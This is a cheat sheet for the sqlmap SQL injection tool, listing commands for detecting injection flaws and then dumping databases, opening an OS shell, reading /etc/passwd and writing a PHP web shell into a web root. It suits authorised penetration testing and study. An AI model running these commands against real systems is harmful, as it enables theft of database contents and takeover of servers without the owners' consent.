# SQLMap - Automatic SQL Injection Tool

Open-source penetration testing tool for detecting and exploiting SQL injection flaws.

## Installation

```bash
# Git installation
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Ubuntu/Debian
apt install sqlmap

# Python pip
pip install sqlmapproject
```

## Basic Usage

```bash
# Test single URL
python sqlmap.py -u "http://example.com/page?id=1"

# POST data testing
python sqlmap.py -u "http://example.com/login" --data="user=test&pass=test"

# Test with cookies
python sqlmap.py -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123"

# Test with custom headers
python sqlmap.py -u "http://example.com/page?id=1" --headers="X-Forwarded-For: 127.0.0.1"
```

## Advanced Detection

```bash
# All parameters testing
python sqlmap.py -u "http://example.com/page?id=1&name=test" --all

# Specific parameter testing
python sqlmap.py -u "http://example.com/page?id=1&name=test" -p id

# Risk and level adjustment
python sqlmap.py -u "http://example.com/page?id=1" --risk=3 --level=5

# Custom injection point
python sqlmap.py -u "http://example.com/page" --data="id=1*&name=test"
```

## Database Enumeration

```bash
# Current database
python sqlmap.py -u "http://example.com/page?id=1" --current-db

# List databases
python sqlmap.py -u "http://example.com/page?id=1" --dbs

# Database tables
python sqlmap.py -u "http://example.com/page?id=1" -D database_name --tables

# Table columns
python sqlmap.py -u "http://example.com/page?id=1" -D database_name -T table_name --columns

# Dump data
python sqlmap.py -u "http://example.com/page?id=1" -D database_name -T table_name --dump
```

## Operating System Interaction

```bash
# OS shell
python sqlmap.py -u "http://example.com/page?id=1" --os-shell

# Command execution
python sqlmap.py -u "http://example.com/page?id=1" --os-cmd="whoami"

# File operations
python sqlmap.py -u "http://example.com/page?id=1" --file-read="/etc/passwd"
python sqlmap.py -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## Request Handling

```bash
# Request from file
python sqlmap.py -r request.txt

# Proxy usage
python sqlmap.py -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Authentication
python sqlmap.py -u "http://example.com/page?id=1" --auth-type=basic --auth-cred="user:pass"

# Custom user agent
python sqlmap.py -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0..."
```

## Output Options

```bash
# Verbose output
python sqlmap.py -u "http://example.com/page?id=1" -v 3

# Output to file
python sqlmap.py -u "http://example.com/page?id=1" --output-dir="/tmp/sqlmap"

# Batch mode (non-interactive)
python sqlmap.py -u "http://example.com/page?id=1" --batch
```
